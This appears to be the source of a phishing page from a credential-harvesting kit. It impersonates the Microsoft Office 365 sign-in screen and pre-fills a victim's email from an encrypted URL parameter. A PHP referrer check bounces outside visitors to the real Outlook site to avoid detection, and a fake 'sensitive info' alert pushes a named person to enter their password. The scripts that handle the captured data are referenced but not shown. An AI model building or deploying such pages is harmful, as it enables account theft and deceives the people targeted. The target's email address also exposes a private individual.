<?php
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);

if($refData['host'] !== $_SERVER['HTTP_HOST']) {

  header("location: https://outlook.office365.com/");
}

?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en">

<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
    <link rel="shortcut icon" href="include/src/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta name="robots" content="none">
    <link href="include/src/css.css" rel="stylesheet">
    <script src="include/src/mp.js"></script>
</head>

<body onload="NE()" class="cb" style="display: block;">
    <div>
        <div>
            <div class="background" role="presentation">
                <div style="background-image: url(include/src/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg);"></div>
                <div id="BGimg" class="backgroundImage" style="background-image: url(include/src/Mic_BG.jpg);">
                </div>
                <div id="dimBG" class=""></div>
            </div>
        </div>
        <div></div>
        <div class="outer">
            <div class="middle">
			<div id="backgroundlh" class="backgroundlh"> <img class="backgroundlg" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="include/src/45_sgsjshsdggdjxdghvcvcj.png"> </div>
                <div class="inner fade-in-lightbox">
                    <div id="mainbox" class="lightbox-cover">
                    </div>
                    <div id="progressBar" class="" role="progressbar" aria-label="Please wait">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <div> <img id="LOGOimg" class="logo" pngsrc="include/src/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="include/src/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="include/src/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                            alt="Microsoft">
                    </div>
                    <div id="fedred" class="animate slide-in-next" data-viewid="8" style="display: none;">
                        <div id="loginHeader" class="row text-title" role="heading" aria-level="1">Taking you to your organization's sign-in page
                        </div>
                        <div class="row progress-container">
                            <div class="progress" role="progressbar" aria-label="Please wait">
                                <div></div>
                                <div></div>
                                <div></div>
                                <div></div>
                                <div></div>
                            </div>
                        </div>
                        <a id="aadRedirectCancel" href="#" aria-describedby="loginHeader">Cancel</a>
                    </div>
                    <div id="emailsection" role="main" class="pagination-view animate slide-in-next">
                        <div class="">
                            <div>
                                <div data-viewid="1" data-showfedcredbutton="true">
                                    <div>
                                        <div class="row text-title" id="loginHeader">
                                            <div role="heading" aria-level="1">Sign in</div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div role="alert" aria-live="assertive">
                                            <div class="alert alert-error col-md-24" style="display:none" id="usernameError">Enter a valid email address, phone number, or Skype name.
                                            </div>
                                        </div>
                                        <div class="form-group col-md-24">
                                            <div class="placeholderContainer"> <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override"  aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader loginDescription"
                                                    placeholder="Email, phone, or Skype" value="<?php require 'engine/encrypt.php'; echo doDecrypt($_GET["y"]); ?>" lang="en"> </div>
                                        </div>
                                    </div>
                                    <div class="position-buttons">
                                        <div class="row">
                                            <div class="col-md-24">
                                                <div class="text-13 action-links">
                                                    <div class="form-group">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSPW_TUADMS9rQVAiqCgkWRAfEgOT42S-240gVavPROk3s5tNxlshxnMRx_OzYr7HsjY2xE0gZGGBA6sgELOydOvcXICbUCSSQSNlZbri74XR3z1NMlik8zaEcpwtDkRJ1HlE5kYGUnmN5CnGIRyxkRhxE_u72zpP56_nv9GP5Tevl5-DrnxcrkBnMraWZNVznAjycEuIFBZoOwzDrjseW8U-gPwFwBcA3AFbJTRNTndZFMuARL7ICQqKQzwl5huHZrKxWLKXUteV2mcglA8kRhFrctGrtCac5daLNunZ_1rS1uIzkkhT1VS2qtxuh7Kz97JqzIFSO6lytPbe1WZ3IR41YjitTWW3O-qUOvE7eVw7OyJS9Bde3YvMmmRm7vjPw3ICsUh-A4plYGhVdjE2DZG9tJiaWoRPLxae-65k-scxgv1sblnS1s_D5PF8kRWPYOun5Esc2Wlg-XjJzL6ZqC7w8VYxpjI6lw2V1MfHqZ4I9HWgN2zxWqlK8mGHKODNweOJo1ajnTxpmxPtlUlJqnZHl2-64q2oBqjUbJyE6jQ4HXfZAHBUVP6pQH1Ppda2Oiy9T99ahsDXa83x3bM3Nqw3wfeMuTBW2trZ3Eo8Se4mfG-Dd5nq5VP3X4Fm8W35v47c3sZC43KTbeUGhXaZChx5L94YLL2BYWirrejevdnhabQei5AiBaArlfbbAnKfBeTr9Iw1e3Ul8yfxv6-vtB-u_iBTkKMjvMbAA-QLi-n8B0&amp;estsfed=1&amp;uaid=6c966c1f06fc4e1d975381b973bffd3f&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US"
                                                            id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></div>
                                                    <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#">Can’t
                                                                access your account?</a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div>
                                                <div class="col-xs-24 no-padding-left-right button-container">
                                                    <div class="inline-block"> <input type="submit" id="idSIButton9" onclick="NE()" class="btn btn-block btn-primary" value="Next"> </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="Passsection" class="animate slide-in-next" style="display: none;" role="main">
                        <div class="">
                            <div>
                                <div>
                                    <div class="identityBanner">
                                        <button type="button" class="backButton" id="idBtn_Back" aria-label="Back"><img role="presentation"
                                                    pngsrc="include/src/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
                                                    svgsrc="include/src/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                                                    src="include/src/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
                                            </button>
                                        <div id="displayName" class="identity" title="damien.brtillot@tec-ker.com">
                                            damien.brtillot@tec-ker.com
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="pagination-view animate has-identity-banner">
                                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
                                    <input type="hidden" name="i13" value="0"> <input type="hidden" name="login" value="damien.brtillot@tec-ker.com">
                                    <input type="text" name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" value="11"> <input type="hidden" name="LoginOptions" value="3"> <input type="hidden" name="lrt"
                                        value=""> <input type="hidden" name="lrtPartition" value="">
                                    <input type="hidden" name="hisRegion" value=""> <input type="hidden" name="hisScaleUnit" value="">
                                    <div id="loginHeader" class="row text-title" role="heading" aria-level="1">Enter password
                                    </div>
                                    <div class="row">
                                        <div class="form-group col-md-24">
                                            <div role="alert" aria-live="assertive">
                                                <div id="passwordError" class="alert alert-error" style="display:none;">Please enter your password.
                                                </div>
						    <div id="sensitive" class="alert alert-error">Because you're accessing sensitive info, you need to verify your password.
                                            </div>
                                            </div>
                                            <div class="placeholderContainer">
                                                <input name="passwd" type="text" id="i0118" autocomplete="off" class="form-control" aria-required="true" aria-describedby="loginHeader passwordDesc" placeholder="Password" aria-label="Enter the password for damien.brtillot@tec-ker.com">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="position-buttons">
                                        <div>
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRO2_TUABG47xoqwgqFhgrxARyYvv6GalDXIfYTWzXiVPHWSLHdhqb2NdJbuomv4CBoawdWUAdECAqEAxsDJ06s7AiJsSAGBhIfwDLN53h0zkPcmSZrN6nAc043FDABYcFOC2QBO7QFIsDBrCAIkiPIcDs9tb2p1Kxkn12ob552mKWf1_fO8fujBFK5tVKJU3TMhyNAtcvuzCqfMCwKwz7jmFn2YIf493OeXbOAlagOE7gKZIBgKYFpmyHNUaL2lHfqiM1PAzsDkFolsq0LGVpWwZSV26qhv2JFrqUHSmpbqmkJrVDzVSQFtVJdc3r0tGqZU5C7ZpvGIxGtSf2SiFV63D8NXtLry3QmLoeOAtW_q_s5gjOokEC5-gs9wLTEz9WvD0Yx76LyteYH6PAdVAA44MZTPwZCvz5bqfbH_U8nCGGEXcwTCI0YKV204tXAi95BhzARU8UepJ4TO7z01g0nB5oLk4oRkc1x18YU_548lhUeqow1UGDE-UTMwFHliuDrgkc29Qe4drSSPwmJzteMNQHmiIbfN1T-D2bXaJu722uuNYawfgyd3N9Kg68nWQGR8HEv8pjP_IlIlfd2NjaztzN7GT-5LHnhXWtb-9eFd63vjQ_X7wsbf_ez1wWKjDRZFOUOlawlCnbjPkJ1QhCuAIS6aV2ZQrFef0hkN1UoXe5KnlaxE6LxZ9F7MmNzMfN_7X-Bw2&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10">Forgot
                                                                    my password</a>
                                                        </div>
                                                        <div class="form-group">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div>
                                                <div class="col-xs-24 no-padding-left-right button-container">
                                                    <div class="inline-block">
                                                        <input type="submit" id="idSIButton9" onclick="NEE()" class="btn btn-block btn-primary" value="Sign in">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div> </div>
                <div id="footer" class="footer default" role="contentinfo">
                    <div>
                        <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy">©2022
                                    Microsoft</span> <a id="ftrTerms" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy
                                    &amp;
                                    cookies</a>
                            <a href="#" role="button" class="moreOptions" aria-label="Click here for troubleshooting information"> <img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"
                                    src="include/src/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
                                <img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"
                                    src="include/src/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="include/src/sc_login.js"></script>
</body>


</html>
